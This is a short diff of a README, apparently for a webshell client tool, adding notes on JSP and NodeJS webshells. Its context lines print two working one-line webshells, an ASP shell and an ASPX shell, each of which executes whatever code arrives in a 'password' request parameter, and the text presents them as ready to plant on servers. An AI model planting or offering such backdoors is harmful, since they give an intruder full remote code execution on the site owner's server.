@@ -20,8 +20,15 @@ These are the simplest oneshell.
 ```<%execute(request("password"))%>```
 - ASPX
 ```<%@ Page Language="Jscript"%><%eval(Request.Item["password"])%>```
-
 Also, Alien support asmx , ashx webshell
+
+## JSP webshell
+Original chopper jsp shell, but some addition.\
+it can display image
+
+## NodeJS webshell
+Differenti to php, asp, aspx, jsp...\
+It is difficult to use in pentestation, but use in management.
 
 ## Server Manager
 - MySQL : PHP
